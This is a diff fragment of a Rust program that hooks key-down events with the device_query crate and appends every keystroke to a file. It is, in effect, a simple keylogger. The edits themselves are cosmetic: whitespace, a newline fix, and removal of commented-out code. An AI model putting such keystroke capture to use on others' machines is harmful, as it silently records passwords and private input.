@@ -6,9 +6,8 @@ fn main() {
 
     let device_state = DeviceState::new();
 
-
     let _guard = device_state.on_key_down(move |key| {
-        println!("Down: {:#?}", key);
+        println!("Down: {:#?}", key);    
 
 
         let mut file = OpenOptions::new()
@@ -25,7 +24,7 @@ fn main() {
             }
             device_query::Keycode::Enter => {
                 // write to file
-                file.write(b"'\n").expect("Failed to write to file");
+                file.write(b"\n").expect("Failed to write to file");
             }
             device_query::Keycode::RShift | device_query::Keycode::Slash => {
                 // write to file
@@ -35,15 +34,7 @@ fn main() {
                 write!(file, "{}",  key).expect("Failed to write to file");  
             }
         }
-        
-        
-        /*if *key == device_query::Keycode::Space {
-            // write to file
-            file.write_all(b" ").expect("Failed to write to file");
-        }
-        else {
-            write!(file, "{}",  key).expect("Failed to write to file");    
-        }*/
+    
     });
         
     loop {}
